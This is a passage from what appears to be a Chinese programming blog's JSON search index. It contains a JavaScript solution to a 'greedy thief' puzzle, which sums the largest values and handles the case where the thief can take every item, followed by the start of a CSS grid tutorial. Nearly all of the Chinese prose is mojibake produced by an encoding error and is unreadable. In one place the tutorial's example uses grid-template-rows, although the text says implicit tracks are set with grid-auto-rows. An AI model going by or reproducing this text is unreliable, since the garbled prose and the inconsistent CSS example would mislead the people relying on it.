ï¼‰ const items = transformToNumber(lines.slice(2)) // é‡æ–°æ’åºï¼Œç”±å¤§æ’åˆ°å° items.sort((a, b) =&gt; b - a) // æŠŠé™£åˆ—åŠ ç¸½ for(let i=0; i&lt;max; i++) { totalValue += items[i] } console.log(totalValue)}// è½‰æ›æˆ Number å‹æ…‹function transformToNumber(arr) { let result = [] for(let i=0; i&lt;arr.length; i++) { result.push(Number(arr[i])) } return result }solve(['3', '5', '1', '3', '5', '7', '9']) // 21 é€™æ¨£å­çœ‹èµ·ä¾†æ²’æœ‰ä»€éº¼å•é¡Œï¼Œç¯„ä¾‹çµ¦çš„æ¸¬è©¦è³‡æ–™ä¹Ÿèƒ½å¾—åˆ°æ­£ç¢ºçµæœã€‚ å‡¡äº‹éƒ½è¦è¨­æƒ³å‘¨åˆ°ä½†æ˜¯ï¼æœ‰ä¸€ä»¶å¾ˆé‡è¦çš„äº‹æƒ…è¢«å¿½ç•¥äº†ï¼šå¦‚æœå°å·èƒ½å·çš„æ•¸é‡ &gt;= æ‰€æœ‰ç‰©å“çš„æ•¸é‡å‘¢ï¼Ÿ æ²’æœ‰éŒ¯ï¼Œæˆ‘æƒ³é€™ä¸€é¡Œ AC ç‡æœƒé‚£éº¼ä½å°±æ˜¯å› ç‚ºå¾ˆå¤šäººè·Ÿæˆ‘ä¸€æ¨£éƒ½å¿½ç•¥æ‰äº†é€™ä»¶äº‹ï¼Œæ‰€ä»¥æ‰æœƒæ‡·ç–‘äººç”Ÿè€åŠå¤©ã€‚ å…ˆè®“æˆ‘å€‘çœ‹çœ‹å¦‚æœåœ¨ã€Œèƒ½å·çš„æ•¸é‡ &gt;= ç‰©å“çš„æ•¸é‡ã€çš„æƒ…æ³æœƒç™¼ç”Ÿä»€éº¼ï¼š 1solve(['100', '5', '1', '3', '5', '7', '9']) ç­”æ¡ˆæ˜¯ NaNï¼Œå•é¡Œå‡ºåœ¨é€™ä¸€æ®µï¼š 1234// æŠŠé™£åˆ—åŠ ç¸½for(let i=0; i&lt;max; i++) { totalValue += items[i]} é™£åˆ—çš„ç‰©å“åªæœ‰ [1, 3, 5, 7, 9] é€™äº”å€‹ï¼Œè€Œ max æ˜¯ 100ï¼Œä¹Ÿå°±æ˜¯èªªé€™å€‹è¿´åœˆæœƒå¾ 0 è·‘åˆ° 99ã€‚ æ‰€ä»¥è«‹æƒ³æƒ³çœ‹ï¼Œåœ¨ item[5] çš„æ™‚å€™æœƒç™¼ç”Ÿä»€éº¼ï¼Ÿ 12// è¿´åœˆè·‘åˆ°ç¬¬å…­åœˆï¼ˆi = 5ï¼‰totalValue += undefined ç¾åœ¨ä½ çŸ¥é“ç‚ºä»€éº¼æœƒå†’å‡º NaN äº†å§ã€‚ æ­£ç¢ºçš„ä½œæ³•ç¶“éå‰›å‰›çš„æ•™è¨“å¾Œï¼Œæˆ‘å€‘å¯ä»¥ä¿®æ­£æˆé€™æ¨£ï¼š 123456789101112131415161718192021222324252627282930313233343536373839function solve(lines) { // å°å·èƒ½å·åˆ°çš„ç¸½é‡‘é¡ let totalValue = 0 // å°å·èƒ½å¸¶èµ°ç‰©å“çš„æœ€å¤§æ•¸é‡ const max = Number(lines[0]) // ç‰©å“çš„ç¸½æ•¸é‡ const totalItem = Number(lines[1]) // æ‰€æœ‰ç‰©å“ï¼ˆé™¤æ‰å‰å…©ç­†å…ƒç´ ï¼‰ const items = transformToNumber(lines.slice(2)) /* Edge caseï¼š å°å·å¯ä»¥å·çš„æ•¸é‡ &gt;= æ‰€æœ‰ç‰©å“çš„æ•¸é‡ é€™æ™‚å¾Œçš„ç­”æ¡ˆå°±è®Šæˆæ˜¯é™£åˆ—ç¸½å’Œ */ if(max &gt;= totalItem) { for(let i=0; i&lt;items.length; i++) { totalValue += items[i] } console.log(totalValue) } else { // é‡æ–°æ’åºï¼Œç”±å¤§æ’åˆ°å° items.sort((a, b) =&gt; b - a) // åˆ‡å‰²å‡ºå¯å·çš„ç‰©å“é™£åˆ— for(let i=0; i&lt;max; i++) { totalValue += items[i] } console.log(totalValue) }}// è½‰æ›æˆ Number å‹æ…‹function transformToNumber(arr) { let result = [] for(let i=0; i&lt;arr.length; i++) { result.push(Number(arr[i])) } return result }solve(['100', '5', '1', '3', '5', '7', '9']) // 25 åˆ©ç”¨ slice() å¯«å‡ºæ›´ç°¡æ½”çš„ä½œæ³•é™¤äº†ç”¨ for è¿´åœˆä¾†æ±‚é™£åˆ—ç¸½å’Œä»¥å¤–ï¼Œä½ ä¹Ÿå¯ä»¥æ›å€‹æ€ç¶­ï¼š æŠŠç‰©å“é™£åˆ—åšæ’åºï¼Œç”±å¤§æ’åˆ°å° åˆ‡å‰²å‡ºç‰©å“é™£åˆ—çš„ç¯„åœï¼Œå¾ 0 åˆ‡åˆ° n çš„ç¯„åœï¼ˆn = å°å·èƒ½å·çš„ç¸½æ•¸é‡ï¼‰ æŠŠåˆ‡å‰²å‡ºçš„é™£åˆ—åŠ ç¸½ æ‰€ä»¥æœ€å¾Œæœƒå¯«å‡ºé€™æ¨£å­çš„ç¨‹å¼ç¢¼ï¼š 1234567891011121314151617181920212223242526function solve(lines) { // å°å·èƒ½å·åˆ°çš„ç¸½é‡‘é¡ let totalValue = 0 // å°å·èƒ½å¸¶èµ°ç‰©å“çš„æœ€å¤§æ•¸é‡ const max = Number(lines[0]) // ç‰©å“çš„æ•¸é‡ const totalItem = Number(lines[1]) // æ‰€æœ‰ç‰©å“ï¼ˆé™¤æ‰å‰å…©ç­†å…ƒç´ ï¼‰ const items = transformToNumber(lines.slice(2)) // é‡æ–°æ’åºï¼Œç”±å¤§æ’åˆ°å° items.sort((a, b) =&gt; b - a) // åˆ‡å‰²å‡ºå¯å·çš„ç‰©å“é™£åˆ— const availableItems = items.slice(0, max) // è¨ˆç®—é™£åˆ—ç¸½å’Œ totalValue = availableItems.reduce((acc, elem) =&gt; acc + elem, 0) console.log(totalValue)}// è½‰æ›æˆ Number å‹æ…‹function transformToNumber(arr) { let result = [] for(let i=0; i&lt;arr.length; i++) { result.push(Number(arr[i])) } return result } ä¹‹æ‰€ä»¥å¯ä»¥çœç•¥æ‰åˆ¤æ–·çš„åŸå› æ˜¯å› ç‚ºé€™ä¸€å¥ï¼š 1const availableItems = items.slice(0, max) å¦‚æœæŠŠ slice() çš„ç¬¬äºŒå€‹åƒæ•¸è¨­æˆæ¯”é™£åˆ—é•·åº¦å¤§çš„æ•¸å­—ï¼Œæœƒè‡ªå‹•è¦–ç‚ºæ˜¯æœ€å¾Œä¸€å€‹å…ƒç´ çš„æ„æ€ã€‚å› æ­¤ max ä¸ç®¡æ˜¯å¤šå¤§çš„æ•¸å­—ï¼ŒavailableItems éƒ½æœƒæ˜¯ä¸€å€‹å®Œæ•´çš„é™£åˆ—ã€‚","link":"/2021/12/22/greedy-thief/"},{"title":"ä¸€æ­¥ä¸€æ­¥èªè­˜Grid","text":"ç›®å‰åœ¨ç¶²é ä½ˆå±€çš„æ–¹å¼æœ‰å¾ˆå¤šç¨®é¸æ“‡ï¼Œå…¶ä¸­æœ€ä¸»æµçš„ä¸å¤–ä¹å°±æ˜¯flex-boxã€‚ é›–ç„¶ flex ç¢ºå¯¦è¶³ä»¥è™•ç†è¨±å¤šç‰ˆé¢ï¼Œä½¿ç”¨ä¸Šä¹Ÿä¸ç®—å›°é›£ï¼Œä½†ç‚ºäº†æ›´å¢é€²è‡ªå·±çš„èƒ½åŠ›ï¼Œè®“è‡ªå·±åœ¨é¢å°å„ç¨®ç‰ˆå‹éƒ½èƒ½æœ‰æ‡‰å°ä¹‹é“ï¼Œæ‰€ä»¥æˆ‘æ±ºå®šå­¸ç¿’å¦å¤–ä¸€å€‹ä¹Ÿç®—æ˜¯é —æ–°ç©çš„ä½ˆå±€æ–¹å¼ï¼Œgrid-boxã€‚ ä¸éç•¶æˆ‘åœ¨æ‰¾ç›¸é—œè³‡æ–™æ™‚ï¼Œç™¼ç¾ grid çš„ç›¸é—œä¸­æ–‡æ•™å­¸ä¼¼ä¹æ¯”è¼ƒå°‘ä¸€äº›ï¼ˆæ¯”èµ· flexï¼‰ï¼Œæ‰€ä»¥å°±æ±ºå®šè‡ªå·±ä¾†å¯«ä¸€ç¯‡æ–‡ç« ï¼Œå¸Œæœ›èƒ½å¤ ç‚ºæœ‰éœ€è¦çš„äººæä¾›ä¸€ä»½è³‡æºã€‚ å¦å¤–ï¼Œç”±æ–¼ grid-box çš„æ¦‚å¿µå¯èƒ½æ¯” flex-box é‚„è¦ä¾†å¾—è¤‡é›œä¸€äº›ï¼ˆè‡³å°‘å°æˆ‘ä¾†èªªæ˜¯é€™æ¨£å­ï¼‰ï¼Œæ‰€ä»¥é€™ç¯‡æ–‡ç« çš„å…§å®¹ä¹Ÿæœƒæ¯”è¼ƒæ²‰é•·äº›ï¼Œå¯èƒ½æœƒéœ€è¦èŠ±é»æ™‚é–“ä¾†é–±è®€ï¼Œé‚„è«‹å„ä½è¦‹è«’ä¸€ä¸‹ã€‚ æœ€å¾Œå¸Œæœ›å¤§å®¶éƒ½èƒ½å¤ é€éé€™ç¯‡æ–‡ç« ä¾†çœŸæ­£ç†è§£ grid çš„ä½ˆå±€æ–¹å¼ï¼Œæˆ‘ç›¸ä¿¡å¤šå­¸ä¸€æ¨£æŠ€èƒ½ï¼Œå°è‡ªå·±åªæœ‰å¥½ï¼Œæ²’æœ‰å£ã€‚ é—œæ–¼ gridåœ¨å­¸ç¿’ grid çš„èªæ³•å‰ï¼Œæˆ‘èªç‚ºå¤§å®¶å¯ä»¥å…ˆäº†è§£ä¸€ä¸‹ grid çš„åŸºæœ¬çµæ§‹æ˜¯é•·ä»€éº¼æ¨£å­ï¼Œæ¥è‘—æ‰å»å­¸ grid çš„ç›¸é—œå±¬æ€§ï¼Œé€™æ¨£å­çš„å­¸ç¿’é †åºå°ä½ æ‡‰è©²æœƒæ¯”è¼ƒæœ‰å¹«åŠ©ã€‚ èªè­˜æ¬„èˆ‡åˆ—è®“æˆ‘å€‘å¾å»ºç«‹ä¸€å€‹æœ€åŸºæœ¬çš„ grid ç¶²æ ¼é–‹å§‹ï¼š 1&lt;div class=\"box\"&gt;&lt;/div&gt; 12345.box { display: grid; grid-template-columns: 100px 100px 100px 100px; grid-template-rows: 100px 100px;} å…ˆä¸ç”¨åœ¨æ„é‚£äº›æ•¸å­—æ˜¯ä»€éº¼æ„æ€ï¼Œç¸½ä¹‹ä½ èƒ½çœ‹åˆ°ï¼Œæˆ‘å€‘å»ºç«‹äº†ä¸€å€‹å››æ¬„å…©åˆ—çš„æ ¼å­ã€‚ æ¬„ = æ¯ä¸€å€‹ç›´æ’ï¼Œè‹±æ–‡ç‚º â€œcolumnâ€ ã€‚åˆ— = æ¯ä¸€å€‹æ©«æ’ï¼Œè‹±æ–‡ç‚º â€œrowâ€ ã€‚ æ¥è‘—æˆ‘å€‘ä¾†çœ‹å‰›å‰›è¨­å®šçš„æ¯ä¸€å€‹å±¬æ€§å§ï¼š 1display: grid; ä»£è¡¨æˆ‘å€‘åœ¨.boxé€™å€‹å€å¡Šä¸­å»ºç«‹ä¸€å€‹ grid ç¶²æ ¼ï¼Œå°±è·Ÿåœ¨ä½¿ç”¨ flex æ™‚çš„display:flexæ˜¯ä¸€æ¨£çš„æ¦‚å¿µã€‚ 1grid-template-columns: 100px 100px 100px 100px; é€™æ˜¯ç”¨ä¾†è¨­å®š ã€Œæ¬„(column)ã€ çš„éƒ¨åˆ†ï¼Œä»£è¡¨æ¯å€‹æ¬„çš„å¯¬åº¦ç‚º 100pxï¼Œè€Œæˆ‘å€‘è¨­å®šäº† 4 æ¬¡ï¼Œæ‰€ä»¥ç¸½å…±å°±æœƒç”¢ç”Ÿ 4 å€‹æ¬„ã€‚ 1grid-template-rows: 100px 100px; é€™æ˜¯ç”¨ä¾†è¨­å®š ã€Œåˆ—(row)ã€ çš„éƒ¨åˆ†ï¼Œä»£è¡¨æ¯å€‹åˆ—çš„å¯¬åº¦ç‚º100pxï¼Œè€Œæˆ‘å€‘è¨­å®šäº† 2 æ¬¡ï¼Œæ‰€ä»¥ç¸½å…±å°±ç”¢ç”Ÿ 2 å€‹åˆ—ã€‚ æ‰€ä»¥ï¼Œä¸€å€‹æœ€åŸºæœ¬çš„ grid ç¶²æ ¼ï¼Œå°±æ˜¯ç”± ã€Œæ¬„èˆ‡åˆ—ã€ ä¾†çµ„æˆçš„ã€‚ èªè­˜æ ¼ç·šåœ¨ä½ èªè­˜æ¬„èˆ‡åˆ—å¾Œï¼Œè®“æˆ‘å€‘å›é ­ä¾†è«‡è«‡é‚£äº›æ•¸å­—ï¼Œåˆæ˜¯æ€éº¼ä¸€å›äº‹å§ï¼Ÿ ä¸€å€‹ grid ç¶²æ ¼ ä¸­ï¼Œé™¤äº†æ¬„èˆ‡åˆ—ä¹‹å¤–ï¼Œé‚„æœ‰ä¸€å€‹æ±è¥¿å«åš ã€Œæ ¼ç·šã€ã€‚ æ ¼ç·šæ˜¯ä¸€å€‹ç”¨ä¾†åˆ†å‰²æ¯å€‹åˆ—è·Ÿæ¬„çš„ç·šï¼Œè€Œæ¯å€‹æ ¼ç·šéƒ½æœƒæœ‰ä¸€å€‹ç·¨è™Ÿï¼Œé€™å€‹ç·¨è™Ÿæœƒå¾ 1 é–‹å§‹ç®—èµ·ã€‚ æˆ‘çŸ¥é“ä½ å¯èƒ½æ¥è‘—æœƒæƒ³å•ï¼Œé‚£éº¼è² æ•¸åˆä»£è¡¨ä»€éº¼ï¼Ÿ å…¶å¯¦æ ¼ç·šé™¤äº†ç”¨æ­£æ•¸ä¾†è¡¨ç¤ºä»¥å¤–ï¼Œä¹Ÿå¯ä»¥ç”¨è² æ•¸ä¾†è¡¨ç¤ºï¼Œç”¨ä¸­æ–‡ä¾†èªªçš„è©±å°±æ˜¯ ã€Œå€’æ•¸ç¬¬å¹¾å€‹ã€ çš„æ„æ€ã€‚ é‚£æ ¼ç·šèƒ½å¤ åšä»€éº¼ï¼Ÿä¸€æ¨£è®“æˆ‘å€‘ç”¨ä¾‹å­ä¾†èˆ‰ä¾‹å§ï¼š ç¾åœ¨æˆ‘å€‘åœ¨å‰›å‰›å»ºç«‹å¥½çš„ grid ç¶²æ ¼ä¸­æ–°å¢ gridå…ƒç´  1234567&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--greem\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--purple\"&gt;&lt;/div&gt;&lt;/div&gt; ğŸ’¡ è¨»ï¼šé€™è£¡åªæœ‰å°æ–¹å¡Šè¨­å®šèƒŒæ™¯é¡è‰²ï¼ˆgrid å…ƒç´ åœ¨æ²’æœ‰è¨­å®šå¯¬é«˜æ™‚ï¼Œé è¨­æœƒå¡«æ»¿æ•´å€‹æ¬„èˆ‡åˆ—çš„ç©ºé–“ï¼‰ æ‰€ä»¥ä½ èƒ½çœ‹åˆ°ï¼Œåœ¨æˆ‘å€‘é‚„æ²’æœ‰å° grid ç¶²æ ¼ä¸­çš„å…ƒç´ åšä»»ä½•è¨­å®šæ™‚ï¼Œå…ƒç´ æœƒä¾ç…§ ã€Œå·¦ â†’ å³ã€ï¼Œã€Œä¸Š â†’ ä¸‹ã€ é€™æ¨£çš„é †åºä¾†å¡åˆ°æ¯ä¸€å€‹ç¶²æ ¼ä¸­ã€‚ é‚£å¦‚æœæˆ‘å€‘æƒ³è¦æ§åˆ¶å…ƒç´ çš„ä½ç½®å‘¢ï¼Ÿ æ²’æœ‰éŒ¯ï¼Œé€™å€‹æ™‚å€™æ ¼ç·šå°±æ´¾ä¸Šç”¨å ´äº†ã€‚ é€™è£¡å…ˆä»‹ç´¹ä¸€å€‹å±¬æ€§ï¼šgrid-column-startï¼Œå¯ä»¥ç”¨ä¾†æŒ‡å®š grid å…ƒç´ çš„èµ·å§‹ä½ç½®ã€‚ ç¾åœ¨è®“æˆ‘å€‘ä¾†æ›´æ”¹ç´«è‰²æ–¹å¡Šçš„ä½ç½®ï¼š 123.item--purple { grid-column-start: 2;} ğŸ’¡ è¨»ï¼šåœ¨æ²’æœ‰æŒ‡å®šgrid-column-end (çµ‚é»ä½ç½®) æ™‚ï¼Œgrid å…ƒç´ é è¨­æœƒè·¨åˆ°ä¸‹ä¸€æ¢æ ¼ç·š (2 â†’ 3)ã€‚ é€™æ¨£å­æˆ‘å€‘å°±æŠŠç´«è‰²æ–¹å¡Šæ”¾åˆ°ä»¥æ ¼ç·š(2)ç‚ºèµ·å§‹é»çš„ä½ç½®ã€‚ é‚„è¨˜å¾—æˆ‘å€‘èªªéæ ¼ç·šä¹Ÿå¯ä»¥ç”¨è² æ•¸ä¾†è¡¨ç¤ºå—ï¼Ÿ è®“æˆ‘å€‘åœ¨ä¿®æ”¹ä¸€ä¸‹ç´«è‰²æ–¹å¡Šçš„ä½ç½®ï¼š 123.item--purple { grid-column-start: -2;} ç¾åœ¨ç´«è‰²æ–¹å¡Šè¢«æ”¾åˆ°ä»¥æ ¼ç·š(-2)ç‚ºèµ·å§‹é»çš„ä½ç½®ã€‚ æˆ‘æƒ³é€™æ¨£å­ä½ å°æ–¼æ ¼ç·šæ‡‰è©²å°±æœ‰ä¸€äº›æ¦‚å¿µäº†ã€‚ ä¸éï¼Œé™¤äº†è¨­å®šå…ƒç´ çš„èµ·å§‹ä½ç½®ä»¥å¤–ï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥è¨­å®šå…ƒç´ çš„çµ‚é»ä½ç½®ã€‚ å†è®“æˆ‘å€‘ä»‹ç´¹ç¬¬äºŒå€‹å±¬æ€§ï¼šgrid-columns-end æˆ‘å€‘ä¸€æ¨£ä¾†æ§åˆ¶ç´«è‰²æ–¹å¡Šçš„ä½ç½®ï¼š 1234.item--purple { grid-column-start: 2; grid-column-end: 4;} é€™è£¡è¦ç‰¹åˆ¥æé†’ä¸€ä¸‹ï¼Œé›–ç„¶ç´«è‰²æ–¹å¡Šçœ‹èµ·ä¾†æ˜¯ä½”æ“šç¬¬ 2 åˆ° ç¬¬ 3 æ¬„çš„ç¯„åœï¼Œä½†ç”±æ–¼æˆ‘å€‘æ˜¯ä»¥æ ¼ç·šä¾†åšæ§åˆ¶ï¼Œæ‰€ä»¥æ­£ç¢ºçš„ä½ç½®æ‡‰è©²æ˜¯ 2 â†’ 4ï¼Œè€Œä¸æ˜¯ 2 â†’ 3 å“¦ï¼ å¦å¤–ï¼Œå‰›å‰›éƒ½æ˜¯ä»¥ æ¬„(column) ä¾†åšä»‹ç´¹ï¼Œä¸éé™¤äº† æ¬„(column) ä»¥å¤–ï¼Œæˆ‘å€‘ä¹Ÿèƒ½å¤ æ§åˆ¶ åˆ—(row) çš„éƒ¨åˆ†ã€‚å…©è€…çš„æ¦‚å¿µå…¶å¯¦éƒ½æ˜¯ä¸€æ¨£çš„ï¼Œåªæ˜¯å¾ æ¬„(column) è®Šæˆ åˆ—(row) è€Œå·²ï¼Œé€™è£¡æˆ‘æŠŠç›¸é—œçš„å±¬æ€§ï¼Œä»¥åŠç¸®å¯«å½¢å¼ï¼Œæ¢åˆ—çµ¦å„ä½åƒè€ƒï¼š 1234567891011// æ§åˆ¶æ¬„grid-column-start: 1;grid-column-end: 3;// ç¸®å¯«å½¢å¼grid-column: 1 / 3;// æ§åˆ¶åˆ—grid-row-start: 2;grid-row-end: 4;// ç¸®å¯«å½¢å¼grid-row: 2 / 4; æœ€å¾Œé™„ä¸Š Codepen çµ¦å¤§å®¶ç·´ç¿’ ï¼š See the Pen grid-column-start / end &amp; grid-row-start / end by jim (@jubeatt) on CodePen. ğŸ’¡ å¦‚æœçœ‹ä¸æ‡‚ SCSS çš„èªæ³•æ²’æœ‰é—œä¿‚ï¼Œè£¡é¢æœ‰æä¾›è¨»è§£ä¾†å”åŠ©å„ä½ã€‚ èªè­˜é¡¯æ€§æ ¼ç·šèˆ‡éš±æ€§æ ¼ç·šåœ¨ä½ é–‹å§‹å­¸ç¿’ grid ç›¸é—œçš„å±¬æ€§å‰ï¼Œæœ€å¾Œé‚„æœ‰ä¸€ä»¶äº‹æƒ…å¾—çŸ¥é“ã€‚ å…¶å¯¦æ ¼ç·šæœ¬èº«é‚„å¯ä»¥åœ¨å€åˆ†ç‚ºä»¥ä¸‹å…©ç¨®ï¼š é¡¯æ€§æ ¼ç·š (explicit tracks) éš±æ€§æ ¼ç·š (implicit tracks) ğŸ’¡ è¨»ï¼štracks é€™å€‹å–®å­—çš„æ­£çµ±ç¿»è­¯ç¿»ä½œã€Œè»Œé“ / è»Œè·¡ã€ï¼Œä¸éæˆ‘å€‹äººé‚„æ˜¯å–œæ­¡ç”¨æ ¼ç·šä¾†ç¨±å‘¼ã€‚ ä½¿ç”¨grid-template-rows, grid-template-columnsä¾†ç”¢ç”Ÿå‡ºçš„æ ¼ç·šï¼Œéƒ½å«åš é¡¯æ€§æ ¼ç·š (explicit tracks)ã€‚ é‚£éš±æ€§æ ¼ç·šå‘¢ï¼Ÿè®“æˆ‘å€‘ä¾†çœ‹å€‹ä¾‹å­å§ï¼š 1234&lt;div class=\"box\"&gt; &lt;div class=\"item item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item item--blue\"&gt;&lt;/div&gt;&lt;/div&gt; 1234567891011121314.box { display: grid; // å»ºç«‹å…©å€‹æ¬„ï¼ˆé¡¯æ€§æ ¼ç·šï¼‰ grid-template-columns: 100px 100px; // æ¯æ¬„ \"ä¹‹é–“\" çš„é–“éš” column-gap: 20px;}.item { // ç”±æ–¼ç¶²æ ¼ä¸­æ²’æœ‰è¨­å®šåˆ—ï¼Œ // gridå…ƒç´ ç„¡æ³•å¡«æ»¿åˆ—çš„ç©ºé–“ï¼Œ // æ‰€ä»¥é€™è£¡å…ˆæŒ‡å®šä¸€å€‹é«˜åº¦ height: 100px;} å—¯â€¦çœ‹èµ·ä¾†æ²’æœ‰ä»€éº¼ç‰¹åˆ¥çš„ã€‚ é€™è£¡é€é Firefox çš„é–‹ç™¼è€…å·¥å…·ä¾†æŸ¥çœ‹ï¼Œæˆ‘å€‘èƒ½ç™¼ç¾ä¸€äº›ä¸ä¸€æ¨£çš„æ±è¥¿ï¼š ğŸ’¡ ä»”ç´°è§€å¯Ÿç·šï¼Œä½ æœƒçœ‹åˆ°æœ‰ä¸€äº›å·®ç•°ï¼ˆå»ºè­°è¦æ”¾å¤§ä¸€é»çœ‹æ¯”è¼ƒæ¸…æ¥šï¼‰ ä½ æœƒçœ‹åˆ°æœ‰ä¸‰ç¨®æ ¼ç·šï¼Œåˆ†åˆ¥ç‚ºï¼š è™›ç·šï¼šä»£è¡¨é¡¯æ€§æ ¼ç·š é»ç·šï¼šä»£è¡¨éš±æ€§æ ¼ç·š å¯¦ç·šï¼šä»£è¡¨é¡¯æ€§æ ¼ç·šçš„èµ·é» / çµ‚é» å¯¦ç·šçš„éƒ¨åˆ† æˆ‘å€‘åœ¨ä¸€é–‹å§‹é€égrid-template-columns: 100px 100px;å»ºç«‹äº†å…©å€‹æ¬„ï¼Œæ‰€ä»¥å·¦å³å…©ç«¯çš„å¯¦ç·šä»£è¡¨é¡¯æ€§æ ¼ç·šçš„èµ·é»èˆ‡çµ‚é»ã€‚ ä½ å¯èƒ½æœƒå¥½å¥‡ï¼Œé ‚ç«¯é‚£æ¢é¡¯æ€§æ ¼ç·šçš„èµ·é»ï¼ˆåˆ—ï¼‰æ˜¯æ€éº¼å›äº‹ï¼Œç•¢ç«Ÿæˆ‘å€‘ä¸¦æ²’æœ‰å°åˆ—åšè¨­å®šä¸æ˜¯å—ï¼Ÿé€™å€‹å˜›ï¼Œæˆ‘æ˜¯é€™æ¨£ç†è§£çš„ï¼Œæœ‰ä¸€å¥è©±å«åšæœ‰å§‹æœ‰çµ‚ï¼Œæ‰€ä»¥æˆ‘æƒ³åœ¨ grid ä¸­ä¹Ÿæ˜¯é€™å€‹é“ç†ï¼Œæ—¢ä½¿æˆ‘å€‘æ²’æœ‰å°åˆ—åšè¨­å®šï¼Œå®ƒä¹Ÿæ‡‰è©²è¦æœ‰ä¸€å€‹èµ·å§‹é»ã€‚ è™›ç·šçš„éƒ¨åˆ† æˆ‘å€‘è¨­å®šæ¯ä¸€æ¬„çš„å¯¬åº¦ç‚º100pxï¼Œæ‰€ä»¥æ¯100pxå°±æœƒæœ‰ä¸€æ¢è™›ç·šä¾†ä»£è¡¨ä¸€æ¬„çš„å¯¬åº¦ã€‚ é»ç·šçš„éƒ¨åˆ† æˆ‘å€‘ä¸¦æ²’æœ‰ä½¿ç”¨grid-template-rowsä¾†è¨­å®šåˆ—ï¼Œæ‰€ä»¥é€™æ™‚å€™ç€è¦½å™¨å°±è‡ªå‹•å¹«æˆ‘å€‘ç”¢ç”Ÿäº†ä¸€æ¢æ–°çš„æ ¼ç·šï¼Œé€™ç¨®æ ¼ç·šå°±ç¨±ç‚º éš±æ€§æ ¼ç·š(implicit tracks)ã€‚ è¦æ³¨æ„çš„ä¸€é»æ˜¯ï¼Œåœ¨æ²’æœ‰åšä»»ä½•è¨­å®šæ™‚ï¼Œéš±æ€§æ ¼ç·šçš„å¯¬åº¦æ˜¯ç”± grid å…ƒç´ ä¾†æ’é–‹ï¼Œä¹Ÿå°±æ˜¯èªªï¼Œå¦‚æœ grid å…ƒç´ çš„é«˜åº¦ï¼ˆæˆ–å¯¬åº¦ï¼‰ç‚º0pxï¼Œéš±æ€§æ ¼ç·šçš„å¯¬åº¦å°±æœƒæ˜¯0pxã€‚ åƒè€ƒä¸‹é¢é€™å¼µåœ–ï¼š ğŸš€ Codepenï¼šé»é€™è£¡ è¦å°éš±æ€§æ ¼ç·šåšè¨­å®šï¼Œå¿…é ˆç”¨grid-auto-rows, grid-auto-columnsé€™å…©å€‹å±¬æ€§ã€‚ æˆ‘å€‘å°ä¸Šé¢çš„ç¯„ä¾‹åšå€‹èª¿æ•´ï¼š 1234.box { // å°éš±æ€§æ ¼ç·šåšè¨­å®š grid-template-rows: 130px;} ğŸš€ Codepenï¼šé»é€™è£¡ ğŸ’¡ é›–ç„¶æˆ‘å€‘ç¾åœ¨è¨­å®šäº†åˆ—çš„æ ¼ç·šï¼Œä¸éç”±æ–¼æˆ‘å€‘è¨­å®šçš„æ˜¯éš±æ€§æ ¼ç·šï¼Œæ‰€ä»¥ä½ å¯ä»¥çœ‹åˆ°åœ–ä¸­çš„åˆ—ï¼ˆå°¾ç«¯ï¼‰é‚„æ˜¯ä»¥é»ç·šä¾†é¡¯ç¤ºã€‚ ç‚ºä»€éº¼éœ€è¦éš±æ€§æ ¼ç·šï¼Ÿç›¸ä¿¡çœ‹åˆ°é€™è£¡å¾Œï¼Œä½ æ‡‰è©²å·²ç¶“çŸ¥é“è¦æ€éº¼åˆ†è¾¨é¡¯æ€§æ ¼ç·šèˆ‡éš±æ€§æ ¼ç·šã€‚ä¸éä½ å¯èƒ½é‚„æœ‰ä¸€å€‹ç–‘å•ï¼Œç‚ºä»€éº¼éœ€è¦éš±æ€§æ ¼ç·šå‘¢ï¼Ÿå®ƒåˆæ˜¯ç”¨ä¾†åšä»€éº¼çš„ï¼Ÿ è¦äº†è§£é€™ä»¶äº‹æƒ…ï¼Œå¾—å…ˆå¼„æ¸…æ¥šä¸€ä»¶äº‹ï¼Œä»€éº¼æ™‚å€™æœƒç”¢ç”Ÿéš±æ€§æ ¼ç·šï¼Ÿ â†’ éš±æ€§æ ¼ç·šåªæœ‰åœ¨ grid å…ƒç´ è¶…å‡ºé¡¯æ€§æ ¼ç·šæ‰€å®šç¾©çš„ç¯„åœæ™‚ï¼Œæ‰æœƒç”¢ç”Ÿã€‚ ä»¥å‰é¢çš„ä¾‹å­ä¾†èªªï¼Œæˆ‘å€‘ç”¨ grid-template-columnsä¾†è¨­å®šå…©æ¬„ï¼Œä½†æ²’æœ‰è¨­å®šåˆ—ï¼Œå°±ä¸Ÿäº†å…©å€‹å…ƒç´ åˆ° grid ç¶²æ ¼ä¸­ï¼Œé€™å¾ˆé¡¯ç„¶æœƒè¶…å‡ºé¡¯æ€§æ ¼ç·šçš„ç¯„åœã€‚ è€Œé€™å€‹æ™‚å€™å¦‚æœæ²’æœ‰è‡ªå‹•ç”¢ç”Ÿéš±æ€§æ ¼ç·šçš„è©±ï¼Œæˆ‘å€‘çš„ grid ç¶²æ ¼å¯èƒ½æœƒé•·çš„åƒé€™æ¨£ï¼š æ‰€ä»¥å¦‚æœæ²’æœ‰éš±æ€§æ ¼ç·šçš„è©± â†’ grid ç¶²æ ¼æœƒå› ç‚ºç¼ºä¹è¶³å¤ çš„æ¬„èˆ‡åˆ—ï¼Œè€Œç„¡æ³•å®¹ç´è¶…å‡ºç¯„åœçš„å…ƒç´ ã€‚ç‚ºäº†é¿å…é€™å•é¡Œï¼Œæˆ‘å€‘æ‰éœ€è¦éš±æ€§æ ¼ç·š â†’ ä½¿ grid ç¶²æ ¼ç”¢ç”Ÿå‡ºè¶³å¤ çš„æ¬„èˆ‡åˆ—ï¼Œä¾†å®¹ç´è¶…å‡ºç¯„åœçš„å…ƒç´ ã€‚ æœ€å¾Œï¼Œåšä¸€å€‹å°ç¸½çµï¼š æ ¼ç·šå¯ä»¥åˆ†æˆéš±æ€§æ ¼ç·š / é¡¯æ€§æ ¼ç·šã€‚ é¡¯æ€§æ ¼ç·šæ˜¯ç”¨ grid-templates-columns / rows åšçš„è¨­å®šã€‚ éš±æ€§æ ¼ç·šæ˜¯ç”¨ grid-auto-columns / rows åšçš„è¨­å®šã€‚ éš±æ€§æ ¼ç·šåªæœ‰åœ¨ grid å…ƒç´  